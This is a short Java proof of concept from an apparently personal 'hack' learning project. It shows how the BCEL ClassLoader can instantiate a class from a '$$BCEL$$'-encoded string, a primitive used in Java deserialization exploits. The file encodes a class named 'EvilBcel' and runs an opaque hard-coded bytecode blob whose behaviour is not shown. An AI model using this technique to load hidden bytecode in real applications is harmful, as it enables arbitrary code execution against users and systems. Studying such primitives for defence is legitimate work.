package com.xjjlearning.hack.java.classloader;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.xjjlearning.hack.java.classloader.bytecodes.EvilBcel;
import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;

import java.io.IOException;

/**
 * created by xjj on 2023/1/31
 */
// 8u251中移除 com.sun.org.apache.bcel.internal.util.ClassLoader
public class HelloBcel {
    private static String getEvilCode() throws IOException {
        // 或者使用这种方法
        // JavaClass javaClass = Repository.lookupClass(EvilTemplatesImpl.class);
        // byte[] code = javaClass.getBytes();

        byte[] code = ClassUtil.classAsBytes(EvilBcel.class);
        String encode = Utility.encode(code, true);
        System.out.println(encode);
        return encode;
    }

    public static void main(String[] args) throws Exception {
        // com.sun.org.apache.bcel.internal.util.ClassLoader 重写了loadClass方法
        String encode = "$l$8b$I$A$A$A$A$A$A$A$9dRMo$d3$40$Q$7d$9b8$b1cl$d2$a6$q$7cC$f8N$xQ_8$mZq$m$K$S$c2PD$aar$delW$ed$86$8d$d7$b27U$f8E$9c$7b$v$a8$87$fe$A$7e$Ub$bc$b4$a5$S$9c$f0$ca3$9e7$f3$de$cc$8e$fc$e3$e7$f1$J$80gx$i$o$c0$d5$Q$d7p$3d$c0$8d$ca$df$f4q$xD$D$b7$7d$dc$f1q$97$a1$b9$a92e_2$d4$H$ab$3b$M$de$d0$ecJ$86v$aa2$f9$7e$3e$9b$c8b$9bO4$n$9d$d4$I$aewx$a1$aa$f8$U$f4$ec$be$w$Z$5e$a4$c2$cc$92$c5t$aa$r$_2$95$ed$r$fb$5c$7cN$a6$fc$80$tB$f3$b2$d4$86$ef$ca$o$99$7c$b1R$90$7e$99$8c$O$94$7e5$i$a5$h$M$c1$a6$d0$a7$p0$92$ec$a6$8e$a6L$f2fk$b4$Q2$b7$cadT$W$8f$zi$be$e3$b9kM$b7$60$I$c7f$5e$I$f9ZU$a3$c4g$92$eb$V$3fB$L$a1$8f$7e$84$7b$b8$cf$d03$b9$cc$faOy$7f$c8$b5$98knM$b1$ce$f3$3c$c2$D$3cdX$f9G$c7$I$8f$Q2$3c$ff$df$8b1$y$b9$w$cd$89$b45$99Ja$Z$96$ff$40$l$e7$99U3$9a$3b$dc$93$f6$3c$e8$OV$d3$bfj$e8$f2$9e$5cH$c1$f0dp$n$3b$b6$F$N$b4q$91$f0$a10B$96$r$R$da9$r$ad$5b$d9v$c1$85$a45$f8$f4$xTO$N$acZ$O$d9K$U$r$e4$Z$f9$c6$da7$b0C$97$8e$c86$j$Y$m$s$h$fd$$$c0e$b4$j$b6tN$e6N$M$e8$7cG$adS$3f$82$f7$e9$x$82$b7kGh$k$3a$bcE$dc$G$eaN$b1G_$mV$8bt$o$3a1$9deR$3c$eb$Q$c3$a3$b8C$d1$K$bd$3ej$a9$8f$x$k$r$ban$a8$de$_$ecVU$af$d4$C$A$A";
        new ClassLoader().loadClass("$$BCEL$$" + encode).newInstance();
    }
}
